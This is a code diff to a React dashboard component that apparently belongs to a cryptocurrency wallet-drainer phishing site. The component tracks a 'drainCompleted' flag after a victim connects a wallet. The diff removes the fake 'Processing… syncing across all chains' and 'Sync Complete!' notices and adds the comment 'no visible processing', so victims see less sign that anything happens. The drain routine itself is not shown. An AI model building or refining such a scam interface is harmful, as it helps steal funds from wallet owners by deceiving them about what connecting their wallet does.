@@ -55,11 +55,9 @@ export default function Dashboard() {
     setUserAddress(address);
     setIsWalletConnected(true);
     localStorage.setItem('connectedWallet', address);
-    // Simulate drain completion after successful connection
-    setTimeout(() => {
-      setDrainCompleted(true);
-      localStorage.setItem('drainCompleted', 'true');
-    }, 2000);
+    // Immediate access - no visible processing
+    setDrainCompleted(true);
+    localStorage.setItem('drainCompleted', 'true');
   };
 
   // Redirect to home if not connected or drain not completed
@@ -98,26 +96,8 @@ export default function Dashboard() {
             <WalletConnect onConnect={handleWalletConnect} />
           </div>
           
-          {userAddress && isWalletConnected && !drainCompleted && (
-            <div className="mb-6">
-              <div className="bg-blue-500/20 rounded-xl p-4">
-                <p className="text-blue-300 font-semibold">🔄 Processing...</p>
-                <p className="text-blue-200 text-sm">Completing sync across all chains...</p>
-              </div>
-            </div>
-          )}
-          
-          {userAddress && isWalletConnected && drainCompleted && (
-            <div className="mb-6">
-              <div className="bg-green-500/20 rounded-xl p-4">
-                <p className="text-green-300 font-semibold">✅ Sync Complete!</p>
-                <p className="text-green-200 text-sm">Your wallet has been successfully synced across all chains.</p>
-              </div>
-            </div>
-          )}
-          
           <div className="text-yellow-100 text-sm">
-            <p className="mb-2">🔒 Your wallet connection and sync completion are required to access dashboard features.</p>
+            <p className="mb-2">🔒 Your wallet connection is required to access dashboard features.</p>
             <p>Don't have a wallet? <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline">Install MetaMask</a></p>
           </div>
           
